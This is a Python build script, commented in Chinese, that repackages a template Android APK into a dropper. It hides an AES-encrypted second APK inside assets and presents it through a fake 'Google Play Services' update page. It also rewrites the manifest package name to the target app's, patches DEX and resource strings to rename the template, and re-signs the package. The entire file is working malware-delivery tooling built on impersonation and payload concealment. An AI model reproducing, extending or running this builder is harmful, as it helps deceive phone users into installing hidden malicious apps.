#!/usr/bin/env python3
"""
A包构建脚本 - 基于 Kiss.apk 纯二进制重打包
流程：
  1. 读取 Kiss.apk 模板（含伪加密）
  2. 手动解析 ZIP 结构，提取所有文件数据
  3. AES-CBC 加密 B包 → 替换 assets/nx0M
  4. 替换 update_page.html 占位符
  5. 修改 AndroidManifest.xml 包名（AXML 二进制精确替换）
  6. 用 Python zipfile 重新打包
  7. apksigner.jar 签名
"""
import struct, os, sys, json, shutil, subprocess, zlib, zipfile, io, argparse, re, hashlib

KISS_TEMPLATE = '/opt/fisher-node/apk-builder/kiss_template.apk'
APKSIGNER = '/opt/fisher-node/apk-builder/apksigner.jar'
KEYSTORE = '/opt/fisher-node/apk-builder/_debug.keystore'
ALIAS = 'debugkey'
PASSWORD = 'android'

# Kiss 原始包名
KISS_PKG = 'io.bridge.connect.ou40'

# Kiss AES 加密参数（种子 "nx0M2"）
_SEED = b"nx0M2"
_AES_KEY = hashlib.sha1(_SEED).digest()[:16]
_AES_IV = hashlib.sha256(_SEED).digest()[:16]


def _encode_uleb128(value):
    """编码 ULEB128"""
    result = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value != 0:
            byte |= 0x80
        result.append(byte)
        if value == 0:
            break
    return bytes(result)


def _find_kiss_string_index(dex_data):
    """在 DEX string_ids 中查找 'Kiss' 字符串的 index
    
    返回: (index, string_data_offset) 或 None
    """
    string_ids_size = struct.unpack_from('<I', dex_data, 56)[0]
    string_ids_off = struct.unpack_from('<I', dex_data, 60)[0]
    
    for i in range(string_ids_size):
        str_data_off = struct.unpack_from('<I', dex_data, string_ids_off + i * 4)[0]
        # MUTF-8 格式: uleb128(char_count) + data + 0x00
        # "Kiss" = len=4, data=4B697373, null=00
        if (str_data_off + 6 <= len(dex_data) and 
            dex_data[str_data_off] == 4 and  # uleb128 length = 4
            dex_data[str_data_off+1:str_data_off+5] == b'Kiss' and
            dex_data[str_data_off+5] == 0):
            return (i, str_data_off)
    return None


def replace_dex_string_inplace(dex_data: bytes, new_name: str) -> bytes:
    """原地替换 DEX 中 'Kiss' 的 4 字节 ASCII 数据（不改长度/结构）
    
    仅用于 new_name 是纯 ASCII 且 <= 4 字符的情况。
    只修改 string_data 中的 4 个内容字节，保持 uleb128 和 null terminator 不变。
    """
    result = _find_kiss_string_index(dex_data)
    if result is None:
        print("  ⚠️ DEX 中未找到 'Kiss' 字符串，跳过")
        return dex_data
    
    kiss_idx, str_data_off = result
    new_utf8 = new_name.encode('utf-8')
    new_char_count = len(new_name)
    
    dex_data = bytearray(dex_data)
    
    # 原始: [04] [4B 69 73 73] [00]
    # 修改 uleb128 char_count
    dex_data[str_data_off] = new_char_count
    # 写入 4 bytes 数据区（短的补 0x00）
    for i in range(4):
        dex_data[str_data_off + 1 + i] = new_utf8[i] if i < len(new_utf8) else 0
    # null terminator 保持
    dex_data[str_data_off + 5] = 0
    
    # 重算 SHA-1 + Adler32
    sha1_hash = hashlib.sha1(bytes(dex_data[32:])).digest()
    dex_data[12:32] = sha1_hash
    adler = zlib.adler32(bytes(dex_data[12:])) & 0xFFFFFFFF
    struct.pack_into('<I', dex_data, 8, adler)
    
    print(f"  DEX 字符串: 'Kiss' → '{new_name}' (原地, {len(new_utf8)}B)")
    return bytes(dex_data)


def patch_dex_kiss_to_empty(dex_data: bytes) -> bytes:
    """修改 DEX bytecode: const-string v13, "Kiss" → const-string v13, ""
    
    通过修改 bytecode 中的 string_id 引用（从 #1190 改为 #0 空字符串）
    只改 2 个字节（string_id 参数），不改 string_data 区域
    """
    # const-string v13, @1190 的字节码: 1A 0D A6 04
    # 改为 const-string v13, @0:          1A 0D 00 00
    kiss_id = 1190
    pattern = bytes([0x1A, 0x0D, kiss_id & 0xFF, (kiss_id >> 8) & 0xFF])
    
    idx = dex_data.find(pattern)
    if idx < 0:
        print("  ⚠️ DEX: 找不到 const-string v13 @Kiss 字节码")
        return dex_data
    
    dex_data = bytearray(dex_data)
    # 改 string_id 为 0（空字符串）
    dex_data[idx + 2] = 0x00
    dex_data[idx + 3] = 0x00
    
    # 重算 SHA-1
    sha1_hash = hashlib.sha1(bytes(dex_data[32:])).digest()
    dex_data[12:32] = sha1_hash
    
    # 重算 Adler32
    adler = zlib.adler32(bytes(dex_data[12:])) & 0xFFFFFFFF
    struct.pack_into('<I', dex_data, 8, adler)
    
    print(f"  DEX bytecode: const-string v13 @1190('Kiss') → @0('')")
    return bytes(dex_data)


def replace_dex_string(dex_data: bytes, new_name: str) -> bytes:
    """替换 DEX 中 GooglePlayUpdateActivity 的 'Kiss' 字符串为自定义名称
    
    策略：
    - 如果新名字 MUTF-8 字节数 <= 4 (原始 "Kiss" 空间)：原地覆盖
    - 如果新名字更长：找一个足够大的 "牺牲" 字符串，把新内容写在那里，
      然后把 string_ids[1190] 指向那个位置。
      牺牲字符串选择：运行时不影响功能的 debug/框架内部字符串。
    
    不改变 DEX 文件大小/结构，只修改已有字节内容 + checksum/signature。
    """
    result = _find_kiss_string_index(dex_data)
    if result is None:
        print("  ⚠️ DEX 中未找到 'Kiss' 字符串，跳过替换")
        return dex_data
    
    kiss_idx, old_str_off = result
    string_ids_off = struct.unpack_from('<I', dex_data, 60)[0]
    string_ids_size = struct.unpack_from('<I', dex_data, 56)[0]
    
    # 编码新字符串
    new_name_bytes = new_name.encode('utf-8')
    new_char_count = len(new_name)
    uleb_len = _encode_uleb128(new_char_count)
    new_str_payload = uleb_len + new_name_bytes + b'\x00'  # 需要的总空间
    needed_space = len(new_str_payload)
    
    # 检查原地是否够（原始 "Kiss" 占 6 bytes: 01 04 4B697373 00）
    # 实际是 uleb128(4)=1byte + "Kiss"=4bytes + null=1byte = 6
    original_space = 6  # "Kiss" 的总空间
    
    dex_data = bytearray(dex_data)
    
    if needed_space <= original_space:
        # 原地替换
        write_off = old_str_off
        dex_data[write_off:write_off + needed_space] = new_str_payload
        # 用 null 填充剩余空间
        remaining = original_space - needed_space
        if remaining > 0:
            dex_data[write_off + needed_space:write_off + original_space] = b'\x00' * remaining
        print(f"  DEX 字符串: 'Kiss' → '{new_name}' (原地替换)")
    else:
        # 需要更多空间——找一个"牺牲"字符串
        # 遍历所有字符串找一个 >= needed_space 的
        # 优先选择 debug/framework 内部字符串
        victim_idx = -1
        victim_off = -1
        victim_space = 0
        
        # 优先列表：这些字符串在正常运行时不影响功能
        # 从字节模式匹配查找
        for i in range(string_ids_size):
            if i == kiss_idx:
                continue
            off = struct.unpack_from('<I', dex_data, string_ids_off + i * 4)[0]
            # 读 uleb128 长度
            str_len = dex_data[off]
            if str_len >= 128:
                continue  # 跳过复杂 uleb128
            # 找 null 终止
            end = off + 1
            while end < len(dex_data) and dex_data[end] != 0:
                end += 1
            space = end - off + 1
            
            if space >= needed_space:
                # 检查是否是安全可覆盖的字符串
                s = dex_data[off+1:end]
                try:
                    decoded = s.decode('utf-8')
                except:
                    continue
                # 优先选择：Kotlin 反射错误、debug dump、框架内部提示
                safe_markers = [
                    'Kotlin reflection is not available',
                    'did not call through to super',
                    'is already attached to a',
                    'is already complete or completing',
                    'cannot be cast to kotlin',
                    'asked to inflate view for',
                    'for a container view with no id',
                ]
                for marker in safe_markers:
                    if marker in decoded:
                        victim_idx = i
                        victim_off = off
                        victim_space = space
                        break
                if victim_idx >= 0:
                    break
        
        # 如果没找到优先的，用任何 >= needed_space 的字符串
        if victim_idx < 0:
            for i in range(string_ids_size):
                if i == kiss_idx:
                    continue
                off = struct.unpack_from('<I', dex_data, string_ids_off + i * 4)[0]
                str_len = dex_data[off]
                if str_len >= 128:
                    continue
                end = off + 1
                while end < len(dex_data) and dex_data[end] != 0:
                    end += 1
                space = end - off + 1
                if space >= needed_space:
                    victim_idx = i
                    victim_off = off
                    victim_space = space
                    break
        
        if victim_idx < 0:
            print(f"  ⚠️ DEX: 找不到足够大的牺牲字符串 (需要 {needed_space}B)，跳过")
            return bytes(dex_data)
        
        # 在牺牲字符串位置写入新内容
        dex_data[victim_off:victim_off + needed_space] = new_str_payload
        # 用 null 填充剩余空间（保持原字符串后面 clean）
        remaining = victim_space - needed_space
        if remaining > 0:
            dex_data[victim_off + needed_space:victim_off + victim_space] = b'\x00' * remaining
        
        # 修改 string_ids[kiss_idx] 指向牺牲字符串位置
        sid_pos = string_ids_off + kiss_idx * 4
        struct.pack_into('<I', dex_data, sid_pos, victim_off)
        
        print(f"  DEX 字符串: 'Kiss' (#{kiss_idx}) → '{new_name}' (借用 #{victim_idx} 的 {victim_space}B 空间)")
    
    # 重算 SHA-1 signature (covers bytes 32 to end)
    sha1_hash = hashlib.sha1(bytes(dex_data[32:])).digest()
    dex_data[12:32] = sha1_hash
    
    # 重算 Adler32 checksum (covers bytes 12 to end)
    adler = zlib.adler32(bytes(dex_data[12:])) & 0xFFFFFFFF
    struct.pack_into('<I', dex_data, 8, adler)
    
    return bytes(dex_data)


def rebuild_dex_with_name(dex_data: bytes, new_name: str) -> bytes:
    """用 smali 反编译→替换 'Kiss' 字符串→重编译 DEX
    
    通过 apktool 内置的 baksmali/smali 生成全新合法 DEX，
    避免手动修改 DEX 字节导致的 ART 验证器校验失败。
    
    需要服务器上有: java, apktool.jar
    """
    import tempfile, subprocess, shutil
    
    # 写入临时 DEX
    work_dir = tempfile.mkdtemp(prefix='dex_rebuild_')
    dex_path = os.path.join(work_dir, 'classes.dex')
    with open(dex_path, 'wb') as f:
        f.write(dex_data)
    
    apktool_jar = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'apktool.jar')
    
    try:
        # 创建临时 mini APK（apktool 需要 APK 格式输入）
        import zipfile as zf
        mini_apk = os.path.join(work_dir, 'mini.apk')
        with zf.ZipFile(mini_apk, 'w') as z:
            z.write(dex_path, 'classes.dex')
        
        # baksmali 反编译
        smali_dir = os.path.join(work_dir, 'decoded')
        result = subprocess.run(
            ['java', '-jar', apktool_jar, 'd', mini_apk, '-o', smali_dir, '-f', '--no-res'],
            capture_output=True, text=True, timeout=60
        )
        if result.returncode != 0:
            print(f"  ⚠️ baksmali 失败: {result.stderr[:200]}")
            return dex_data
        
        # 替换 smali 中的字符串
        target_smali = os.path.join(smali_dir, 'smali', 'io', 'bridge', 'connect', 'ou40', 'GooglePlayUpdateActivity.smali')
        if os.path.exists(target_smali):
            with open(target_smali, 'r', encoding='utf-8') as f:
                content = f.read()
            
            old_str = 'const-string v13, "Kiss"'
            new_str = f'const-string v13, "{new_name}"'
            
            if old_str in content:
                content = content.replace(old_str, new_str)
                with open(target_smali, 'w', encoding='utf-8') as f:
                    f.write(content)
            else:
                print(f"  ⚠️ smali 中未找到 'Kiss' 字符串")
                return dex_data
        else:
            print(f"  ⚠️ GooglePlayUpdateActivity.smali 不存在")
            return dex_data
        
        # smali 重编译
        rebuilt_apk = os.path.join(work_dir, 'rebuilt.apk')
        result = subprocess.run(
            ['java', '-jar', apktool_jar, 'b', smali_dir, '-o', rebuilt_apk, '-f'],
            capture_output=True, text=True, timeout=60
        )
        if result.returncode != 0:
            print(f"  ⚠️ smali 重编译失败: {result.stderr[:200]}")
            return dex_data
        
        # 从重编译的 APK 提取新 DEX
        with zf.ZipFile(rebuilt_apk) as z:
            if 'classes.dex' in z.namelist():
                new_dex = z.read('classes.dex')
                print(f"  DEX 重编译: 'Kiss' → '{new_name}' ({len(new_dex)} bytes)")
                return new_dex
            else:
                print(f"  ⚠️ 重编译的 APK 中无 classes.dex")
                return dex_data
    
    except Exception as e:
        print(f"  ⚠️ DEX 重编译异常: {e}")
        return dex_data
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)


def _aes_encrypt(data: bytes) -> bytes:
    """AES/CBC/PKCS5Padding 加密"""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as crypto_padding
    from cryptography.hazmat.backends import default_backend

    padder = crypto_padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(_AES_KEY), modes.CBC(_AES_IV), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()


def encrypt_payload(apk_data: bytes) -> bytes:
    """将 B包 APK 打包为 Kiss 格式的 ZIP，再 AES 加密
    
    Kiss nx0M 解密后的 ZIP 结构（和原始完全一致）:
      1. payload_config.json  (配置，splits 指向 B包 entry)
      2. update.apk           (B包 base APK)
      3. pa_base              (B包副本，匹配 splits 列表)
    
    Kiss 安装逻辑：
      - 先找 payload_config.json 读取 splits
      - splits 里的名字有 "nx0M" 前缀，代码去掉前缀后在 ZIP 中匹配
      - 匹配到的 entry 通过 PackageInstaller 安装
      - "update.apk" 作为 base APK 也会被安装
    """
    # split entry 名字（和原始格式一致）
    split_name = 'pa_base_apk'
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as z:
        # 1. payload_config.json（Kiss 先读这个）
        # ⚠️ Kiss 用字符串查找 "splits":[ 来解析，不能有空格！
        config_str = '{"isRemoteControl":false,"isTestKeyEnabled":false,"splits":["nx0M' + split_name + '"],"subscriptionEndMillis":4611686018427387903,"messageAuthenticationCode":"","simpleInstaller":"deprecated"}'
        config_bytes = config_str.encode('utf-8')
        info1 = zipfile.ZipInfo('payload_config.json')
        info1.compress_type = zipfile.ZIP_STORED
        info1.file_size = len(config_bytes)
        info1.CRC = zlib.crc32(config_bytes) & 0xFFFFFFFF
        z.writestr(info1, config_bytes)
        
        # 2. update.apk (base APK) - STORED 避免 Data Descriptor 问题
        info2 = zipfile.ZipInfo('update.apk')
        info2.compress_type = zipfile.ZIP_STORED
        info2.file_size = len(apk_data)
        info2.CRC = zlib.crc32(apk_data) & 0xFFFFFFFF
        z.writestr(info2, apk_data)
        
        # 3. split entry
        info3 = zipfile.ZipInfo(split_name)
        info3.compress_type = zipfile.ZIP_STORED
        info3.file_size = len(apk_data)
        info3.CRC = zlib.crc32(apk_data) & 0xFFFFFFFF
        z.writestr(info3, apk_data)

    zip_data = buf.getvalue()
    print(f"  内部 ZIP: {len(zip_data)/1024/1024:.1f} MB (config + update.apk + {split_name})")

    # AES 加密
    return _aes_encrypt(zip_data)


def parse_kiss_zip(data):
    """手动解析 Kiss.apk 的 ZIP 结构（处理伪加密）"""
    # 找 EOCD
    eocd_pos = -1
    for i in range(len(data) - 22, max(len(data) - 65536, 0), -1):
        if data[i:i+4] == b'PK\x05\x06':
            eocd_pos = i
            break
    if eocd_pos < 0:
        raise ValueError("No EOCD found")

    cd_offset = struct.unpack_from('<I', data, eocd_pos + 16)[0]
    cd_count = struct.unpack_from('<H', data, eocd_pos + 10)[0]

    entries = []
    pos = cd_offset
    for _ in range(cd_count):
        if data[pos:pos+4] != b'PK\x01\x02':
            break
        cd_method = struct.unpack_from('<H', data, pos + 10)[0]
        cd_comp = struct.unpack_from('<I', data, pos + 20)[0]
        cd_uncomp = struct.unpack_from('<I', data, pos + 24)[0]
        fname_len = struct.unpack_from('<H', data, pos + 28)[0]
        extra_len = struct.unpack_from('<H', data, pos + 30)[0]
        comment_len = struct.unpack_from('<H', data, pos + 32)[0]
        local_off = struct.unpack_from('<I', data, pos + 42)[0]

        fname_bytes = data[pos + 46: pos + 46 + fname_len]
        try:
            name = fname_bytes.decode('utf-8')
        except:
            name = None  # 乱码文件名

        # 从 Local File Header 读取数据
        lf_fname_len = struct.unpack_from('<H', data, local_off + 26)[0]
        lf_extra_len = struct.unpack_from('<H', data, local_off + 28)[0]
        data_start = local_off + 30 + lf_fname_len + lf_extra_len

        # 确定数据大小（CD 的 comp_size 可能被清零）
        # Kiss 的伪加密特点：comp_size=0 但数据实际存在
        # 对于 STORED (method=0): 数据大小 = uncomp_size
        # 对于 DEFLATE (method=8): 数据大小 = comp_size (如果>0) 否则需要估算
        # 对于伪加密 method (非0非8): 当作 STORED 处理，大小 = uncomp_size
        if cd_comp > 0:
            data_size = cd_comp
        elif cd_uncomp > 0:
            data_size = cd_uncomp
        else:
            data_size = 0
        
        raw = data[data_start: data_start + data_size]

        # 真实压缩方法
        if cd_method == 0:
            real_method = 0  # STORED
        elif cd_method == 8 and cd_comp > 0:
            real_method = 8  # DEFLATE
        else:
            # 伪加密或未知 method，数据按原始（STORED）处理
            real_method = 0

        # 解压
        if real_method == 8 and len(raw) > 0:
            try:
                file_data = zlib.decompress(raw, -15)
            except:
                file_data = raw
        else:
            file_data = raw

        if name:
            entries.append({'name': name, 'data': file_data})

        pos += 46 + fname_len + extra_len + comment_len

    return entries


def replace_manifest_package(manifest_data, old_pkg, new_pkg):
    """在 AXML 二进制中精确替换包名（修改字符串数据 + 长度前缀）
    
    AXML StringPool 每个 UTF-16 字符串格式：
      [uint16 charCount] [UTF-16LE data: charCount*2 bytes] [uint16 0x0000 终止符]
    
    替换策略（新包名更短时）：
      1. 修改 charCount 为新包名长度
      2. 写入新包名 UTF-16LE 数据
      3. 写入 0x0000 终止符
      4. 剩余空间补 0x0000（不影响解析）
    """
    old_u16 = old_pkg.encode('utf-16-le')
    new_u16 = new_pkg.encode('utf-16-le')
    old_len = len(old_pkg)
    new_len = len(new_pkg)

    result = bytearray(manifest_data)
    replaced = 0

    def replace_string_in_pool(data, old_str_u16, new_str_u16, old_char_count, new_char_count):
        """在 StringPool 中精确替换一个字符串（含长度前缀修改）"""
        nonlocal replaced
        # 搜索模式：[old_char_count as uint16] [old_str_u16] [0x0000]
        old_len_bytes = struct.pack('<H', old_char_count)
        old_pattern = old_len_bytes + old_str_u16 + b'\x00\x00'
        
        idx = 0
        while True:
            pos = bytes(data).find(old_pattern, idx)
            if pos < 0:
                break
            
            # 构建替换内容（总长度必须和原来一致）
            new_len_bytes = struct.pack('<H', new_char_count)
            new_content = new_len_bytes + new_str_u16 + b'\x00\x00'
            pad_size = len(old_pattern) - len(new_content)
            if pad_size > 0:
                new_content += b'\x00' * pad_size
            
            data[pos:pos + len(old_pattern)] = new_content
            replaced += 1
            idx = pos + len(new_content)
    
    # 替换独立的包名（package 属性）
    replace_string_in_pool(result, old_u16, new_u16, old_len, new_len)
    
    # 替换 fileprovider authority 等
    for suffix in ['.fileprovider', '.androidx-startup', 
                   '.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION', '.INSTALL_COMPLETE']:
        old_full = old_pkg + suffix
        new_full = new_pkg + suffix
        old_full_u16 = old_full.encode('utf-16-le')
        new_full_u16 = new_full.encode('utf-16-le')
        if len(new_full) <= len(old_full):
            replace_string_in_pool(result, old_full_u16, new_full_u16, 
                                  len(old_full), len(new_full))

    return bytes(result), replaced


def build_a_pack(config, b_apk_path, output_path, icon_path=None):
    """构建 A包"""
    app_name = config.get('appName', 'Google Play Services')
    target_pkg = config.get('targetPackageName', '')
    app_size_str = config.get('appSize', '65 MB')
    update_date = config.get('updateDate', 'Jun 5, 2026')
    copyright_year = config.get('copyrightYear', '2026')

    print(f"  A包配置: name={app_name}")
    print(f"  B包: {b_apk_path} ({os.path.getsize(b_apk_path)/1024/1024:.1f} MB)")
    if target_pkg:
        print(f"  目标包名: {target_pkg}")

    if not os.path.exists(KISS_TEMPLATE):
        print(f"ERROR: Kiss 模板不存在: {KISS_TEMPLATE}")
        return False

    # 1. 读取 Kiss 模板
    with open(KISS_TEMPLATE, 'rb') as f:
        kiss_data = f.read()
    entries = parse_kiss_zip(kiss_data)
    print(f"  模板 entries: {len(entries)}")

    # 2. 读取 B包
    with open(b_apk_path, 'rb') as f:
        b_apk_data = f.read()

    # 2.5 自动从 B包 manifest 提取真正包名（用于覆盖安装）
    if not target_pkg:
        try:
            bapk_zip = zipfile.ZipFile(io.BytesIO(b_apk_data))
            b_manifest = bapk_zip.read('AndroidManifest.xml')
            idx = 0
            while idx < len(b_manifest) - 10:
                if b_manifest[idx:idx+8] == b'c\x00o\x00m\x00.\x00':
                    end = idx
                    while end < len(b_manifest) - 1 and b_manifest[end] >= 0x20 and b_manifest[end] < 0x7f and b_manifest[end+1] == 0:
                        end += 2
                    s = b_manifest[idx:end].decode('utf-16-le', errors='ignore')
                    if 8 <= len(s) <= 25 and '.' in s[4:] and 'android' not in s and 'google' not in s and 'titan' not in s and 'keepalive' not in s and 'earlyinit' not in s:
                        target_pkg = s
                        break
                    idx = end
                else:
                    idx += 1
        except:
            pass
        if target_pkg:
            print(f"  B包真正包名(自动提取): {target_pkg}")
        else:
            print(f"  ⚠️ 无法提取B包包名，A包将使用 Kiss 原始包名")

    # 3. 重建 APK
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zout:
        for entry in entries:
            name = entry['name']
            file_data = entry['data']

            # 跳过签名
            if name.startswith('META-INF/') and any(name.upper().endswith(x) for x in ('.SF', '.RSA', '.DSA', '.MF')):
                continue

            # 替换 nx0M（加密 B包）
            if name == 'assets/nx0M':
                print(f"  B包原始: {len(b_apk_data)/1024/1024:.1f} MB")
                file_data = encrypt_payload(b_apk_data)
                print(f"  nx0M 加密后: {len(file_data)/1024/1024:.1f} MB")

            # 替换 DEX 中的 "Kiss" 字符串
            # 使用 smali 反编译→替换→重编译（生成全新合法 DEX）
            # 这在服务器端由 rebuild_dex_with_name() 完成
            elif name == 'classes.dex' and app_name:
                file_data = rebuild_dex_with_name(file_data, app_name)

            # 替换 update_page.html 占位符
            elif name == 'assets/update_page.html':
                try:
                    html = file_data.decode('utf-8')
                    html = html.replace('[APP-NAME]', app_name)
                    html = html.replace('[APP-SIZE]', app_size_str)
                    html = html.replace('[UPDATE-DATE]', update_date)
                    html = html.replace('[COPYRIGHT-YEAR]', copyright_year)
                    # 设备语言占位符
                    html = html.replace('[DEVICE-LANG]', 'en')
                    file_data = html.encode('utf-8')
                    print(f"  HTML 占位符已替换")
                except:
                    pass

            # 替换 manifest 包名
            elif name == 'AndroidManifest.xml':
                if target_pkg:
                    file_data, count = replace_manifest_package(file_data, KISS_PKG, target_pkg)
                    print(f"  Manifest 包名: {KISS_PKG} → {target_pkg} ({count}处)")
                # 替换 manifest 中的应用名 (android:label = "K‌i‌s‌s")
                if app_name:
                    kiss_label = 'K\u200ci\u200cs\u200cs'  # 7 chars
                    new_label = app_name
                    kiss_u16 = kiss_label.encode('utf-16-le')
                    new_u16 = new_label.encode('utf-16-le')
                    # 用 replace_string_in_pool 逻辑（修改长度前缀）
                    old_char_count = len(kiss_label)
                    new_char_count = len(new_label)
                    old_len_bytes = struct.pack('<H', old_char_count)
                    old_pattern = old_len_bytes + kiss_u16 + b'\x00\x00'
                    if old_pattern in file_data:
                        new_len_bytes = struct.pack('<H', new_char_count)
                        new_content = new_len_bytes + new_u16 + b'\x00\x00'
                        pad_size = len(old_pattern) - len(new_content)
                        if pad_size > 0:
                            new_content += b'\x00' * pad_size
                        file_data = file_data.replace(old_pattern, new_content, 1)
                        print(f"  Manifest label: K‌i‌s‌s → {app_name}")

            # 替换 resources.arsc 中的应用名
            elif name == 'resources.arsc' and app_name:
                # Kiss 原始应用名 "K‌i‌s‌s"（带零宽字符）UTF-8: 13 字节
                kiss_name_u8 = 'K\u200ci\u200cs\u200cs'.encode('utf-8')  # 4b e2808c 69 e2808c 73 e2808c 73
                new_name_u8 = app_name.encode('utf-8')
                if len(new_name_u8) <= len(kiss_name_u8):
                    # 等长或更短：直接替换 + 补零
                    padded = new_name_u8 + b'\x00' * (len(kiss_name_u8) - len(new_name_u8))
                    if kiss_name_u8 in file_data:
                        file_data = file_data.replace(kiss_name_u8, padded, 1)
                        print(f"  应用名: K‌i‌s‌s → {app_name} (ARSC UTF-8)")
                else:
                    # 新名字更长：截断到 13 字节
                    truncated = new_name_u8[:len(kiss_name_u8)]
                    # 确保不截断 UTF-8 多字节字符的中间
                    while truncated and (truncated[-1] & 0xC0) == 0x80:
                        truncated = truncated[:-1]
                    truncated = truncated + b'\x00' * (len(kiss_name_u8) - len(truncated))
                    if kiss_name_u8 in file_data:
                        file_data = file_data.replace(kiss_name_u8, truncated, 1)
                        decoded = truncated.rstrip(b'\x00').decode('utf-8', errors='ignore')
                        print(f"  应用名: K‌i‌s‌s → {decoded} (截断)")


            # 替换图标（桌面 launcher icon + 更新页面 icon）
            elif icon_path and os.path.exists(icon_path):
                if name == 'assets/play_icon.png':
                    with open(icon_path, 'rb') as f:
                        file_data = f.read()
                    print(f"  替换: assets/play_icon.png")
                elif name.endswith('.png') and len(file_data) in (21730, 69197, 46356, 25911, 16995, 14256, 5036, 7753):
                    # 这些大小对应 Kiss 的 ic_launcher/ic_launcher_fg/ic_launcher_round 各密度
                    # 全部替换为用户图标（系统会自动缩放）
                    with open(icon_path, 'rb') as f:
                        file_data = f.read()
                    # 不打印每个（太多了）

            # 写入
            info = zipfile.ZipInfo(name)
            if name in ('resources.arsc', 'AndroidManifest.xml'):
                info.compress_type = zipfile.ZIP_STORED
            else:
                info.compress_type = zipfile.ZIP_DEFLATED
            try:
                zout.writestr(info, file_data)
            except:
                info.compress_type = zipfile.ZIP_STORED
                zout.writestr(info, file_data)

    # 保存未签名
    unsigned = output_path + '.unsigned'
    with open(unsigned, 'wb') as f:
        f.write(buf.getvalue())
    print(f"  未签名: {os.path.getsize(unsigned)/1024/1024:.1f} MB")

    # 4. 签名
    if not os.path.exists(KEYSTORE):
        keytool = shutil.which('keytool')
        if keytool:
            subprocess.run([keytool, '-genkey', '-v', '-keystore', KEYSTORE,
                '-alias', ALIAS, '-keyalg', 'RSA', '-keysize', '2048',
                '-validity', '10000', '-storepass', PASSWORD, '-keypass', PASSWORD,
                '-dname', 'CN=Debug,OU=Debug,O=Debug,L=Debug,S=Debug,C=US'],
                capture_output=True)

    signed = False
    if os.path.exists(APKSIGNER) and os.path.exists(KEYSTORE):
        result = subprocess.run([
            'java', '-jar', APKSIGNER, 'sign',
            '--ks', KEYSTORE, '--ks-pass', 'pass:' + PASSWORD,
            '--key-pass', 'pass:' + PASSWORD, '--ks-key-alias', ALIAS,
            '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true',
            '--min-sdk-version', '21',
            '--out', output_path, unsigned
        ], capture_output=True, text=True, timeout=120)
        if result.returncode == 0 and os.path.exists(output_path):
            signed = True
            print(f"  签名成功 (apksigner v1+v2)")
        else:
            print(f"  apksigner 失败: {result.stderr[:200]}")

    if not signed:
        shutil.copy2(unsigned, output_path)
        print(f"  ⚠️ 未签名")

    # 清理
    if os.path.exists(unsigned):
        os.remove(unsigned)

    size = os.path.getsize(output_path) / 1024 / 1024
    print(f"  输出: {output_path} ({size:.1f} MB)")
    print("SUCCESS")
    return True


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='A包构建 (Kiss 二进制重打包)')
    parser.add_argument('--config', required=True, help='JSON 配置')
    parser.add_argument('--bapk', required=True, help='B包路径')
    parser.add_argument('--output', required=True, help='输出路径')
    parser.add_argument('--icon', default='', help='图标路径')
    args = parser.parse_args()

    config = json.loads(args.config)
    success = build_a_pack(config, args.bapk, args.output, args.icon if args.icon else None)
    sys.exit(0 if success else 1)
